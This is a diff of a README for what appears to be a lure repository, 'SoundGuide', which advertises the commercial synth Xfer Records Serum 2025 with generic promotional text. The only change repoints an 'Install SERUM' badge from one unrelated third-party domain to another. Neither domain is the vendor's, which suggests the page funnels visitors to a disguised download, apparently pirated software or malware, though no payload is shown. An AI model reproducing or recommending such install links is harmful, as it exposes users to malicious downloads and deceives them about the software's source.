@@ -5,7 +5,7 @@
 
 🎶 Explore the power of Xfer Records Serum 2025 with SoundGuide! This repository provides tutorials, resources, and insights for music creators to enhance their production in 2025. Join a community passionate about sound design and access Serum’s potential through our curated content.
 
-[![Install](https://img.shields.io/badge/Install-SERUM-blueviolet)](https://cea-groupe.com)
+[![Install](https://img.shields.io/badge/Install-SERUM-blueviolet)](https://glocktober.com)
 
 ### 📌 Core Features
 
